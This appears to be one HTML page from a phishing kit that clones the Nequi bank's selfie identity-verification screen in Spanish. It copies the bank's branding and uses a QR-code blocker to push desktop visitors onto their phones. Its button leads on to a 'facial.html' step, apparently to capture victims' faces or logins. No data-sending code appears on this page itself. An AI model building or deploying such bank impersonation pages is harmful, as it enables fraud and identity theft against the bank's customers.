<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Nequi - Selfie</title>
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: #ffffff;
      color: #200020;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .app-container {
      width: 100%;
      max-width: 420px;
      height: 100vh;
      max-height: 900px;
      padding: 40px 24px 32px 24px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      position: relative;
      background: #ffffff;
    }

    /* Logo Header */
    .header {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 10px;
      margin-bottom: 20px;
    }

    .header img {
      height: 36px;
      object-fit: contain;
    }

    .logo-fallback {
      display: flex;
      align-items: center;
      font-size: 32px;
      font-weight: 800;
      color: #20002b;
      letter-spacing: -1px;
    }

    .logo-fallback::before {
      content: '';
      display: inline-block;
      width: 9px;
      height: 9px;
      background-color: #e6007e;
      margin-right: 4px;
      align-self: flex-start;
      margin-top: 6px;
    }

    /* Titles */
    .title-section {
      text-align: center;
      margin-bottom: 10px;
    }

    .title-section h1 {
      font-size: 24px;
      font-weight: 800;
      color: #1e002c;
      margin-bottom: 8px;
      letter-spacing: -0.3px;
    }

    .title-section p {
      font-size: 15px;
      color: #625768;
      font-weight: 500;
      line-height: 1.35;
      padding: 0 10px;
    }

    /* Central Graphics Container */
    .avatar-wrapper {
      position: relative;
      width: 280px;
      height: 280px;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: auto 0;
    }

    /* Rotating Outer Ring Gradient */
    .rotating-ring {
      position: absolute;
      width: 276px;
      height: 276px;
      border-radius: 50%;
      background: conic-gradient(from 0deg, #e6007e 0%, #ff80bf 25%, #ffffff 50%, #e6007e 75%, #e6007e 100%);
      animation: spin 3s linear infinite;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 0 15px rgba(230, 0, 126, 0.15);
    }

    .rotating-ring-inner-mask {
      width: 260px;
      height: 260px;
      background: #ffffff;
      border-radius: 50%;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    /* Static Inner Avatar Image */
    .static-avatar {
      position: absolute;
      width: 250px;
      height: 250px;
      border-radius: 50%;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 2;
      background: #ffffff;
    }

    .avatar-img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      clip-path: circle(44.5% at 50% 50%);
    }

    /* Efecto de brillo/sombra blanca estrictamente vertical, oscilando de izquierda a derecha */
    .static-avatar::after {
      content: '';
      position: absolute;
      top: 0;
      left: -80%;
      width: 80%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent 0%,
        rgba(255, 255, 255, 0.0) 20%,
        rgba(255, 255, 255, 0.65) 50%,
        rgba(255, 255, 255, 0.0) 80%,
        transparent 100%
      );
      animation: shimmerVerticalStraight 2.5s ease-in-out infinite alternate;
      pointer-events: none;
      z-index: 3;
    }

    @keyframes shimmerVerticalStraight {
      0% {
        left: -80%;
      }
      100% {
        left: 100%;
      }
    }

    /* Footer / Button Area */
    .footer-section {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-bottom: 10px;
    }

    .instruction-text {
      font-size: 15px;
      color: #4a3e50;
      font-weight: 500;
      text-align: center;
    }

    .btn-primary {
      width: 100%;
      height: 52px;
      background-color: #e6007e;
      color: #ffffff;
      border: none;
      border-radius: 16px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: background-color 0.2s, transform 0.1s;
      box-shadow: 0 4px 12px rgba(230, 0, 126, 0.25);
    }

    .btn-primary:active {
      background-color: #c4006b;
      transform: scale(0.98);
    }

    /* Pantalla de bloqueo para PC con Código QR */
    #desktop-blocker {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #ffffff;
      z-index: 99999;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      padding: 90px;
      text-align: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }

    /* Logo superior en PC más grande */
    .desktop-logo {
      height: 60px; /* Tamaño del logo incrementado */
      object-fit: contain;
      margin-bottom: 28px;
    }

    .qr-container {
      background: #ffffff;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
      border: 1px solid #f0f0f5;
      margin-bottom: 24px;
    }

    .qr-container img {
      width: 220px;
      height: 220px;
      object-fit: contain;
      display: block;
    }

    .desktop-title {
    font-size: 22px;
    font-weight: 800;
    color: #1e002c;
    margin-bottom: 10px;
  }

  /* Ancho corregido a 380px para que las líneas tengan el ancho idéntico a la otra pantalla */
  .desktop-desc {
    font-size: 15px;
    color: #625768;
    max-width: 380px;
    line-height: 1.4;
    font-weight: 500;
    margin: 0 auto;
  }

    /* Camera Stream Overlay */
    #camera-preview {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
      border-radius: 50%;
      transform: scaleX(-1);
    }
  </style>
</head>
<body>

  <div id="desktop-blocker">
    <img class="desktop-logo" src="../NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
    <div class="qr-container">
      <img src="../NequiArchivos/codigo_qr.png" alt="Escanea el código QR">
    </div>
    <div class="desktop-title">Escanea el código QR</div>
    <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
  </div>

  <div class="app-container">
    
    <!-- Header -->
    <div class="header">
      <img src="vOLtQz8.png" alt="Nequi" onerror="this.style.display='none'; document.getElementById('alt-logo').style.display='flex';">
      <div id="alt-logo" class="logo-fallback" style="display: none;">Nequi</div>
    </div>

    <!-- Title Section -->
    <div class="title-section">
      <h1>Tómate una selfie</h1>
      <p>Esto te permite iniciar sesión usando tu rostro.</p>
    </div>

    <!-- Central Graphics -->
    <div class="avatar-wrapper">
      
      <!-- Outer Ring Rotating -->
      <div class="rotating-ring">
        <div class="rotating-ring-inner-mask"></div>
      </div>

      <!-- Static Inner Avatar Image -->
      <div class="static-avatar">
        <video id="camera-preview" autoplay playsinline></video>
        <img id="avatar-img" class="avatar-img" src="../NequiArchivos/avatar1.png" alt="Avatar Nequi">
      </div>

    </div>

    <!-- Footer -->
    <div class="footer-section">
      <p class="instruction-text">Quédate quieto, la foto se tomará automáticamente</p>
      <button class="btn-primary" onclick="takeSelfieDelay()">Tomar selfie</button>
    </div>

  </div>

  <script>
    // Función para detectar si el dispositivo es un computador
    function checkDevice() {
      const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
      if (isDesktop) {
        document.getElementById('desktop-blocker').style.display = 'flex';
      }
    }

    async function startCamera() {
      const video = document.getElementById('camera-preview');
      const img = document.getElementById('avatar-img');
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" }, 
          audio: false 
        });
        video.srcObject = stream;
        video.style.display = 'block';
        img.style.display = 'none';
      } catch (err) {
        alert("No se pudo acceder a la cámara o el permiso fue denegado.");
      }
    }

    function takeSelfieDelay() {
      setTimeout(() => {
        window.location.href = 'facial.html';
      }, 1000);
    }

    // Ejecutar verificación al cargar la página
    window.addEventListener('DOMContentLoaded', checkDevice);
  </script>
</body>
</html>
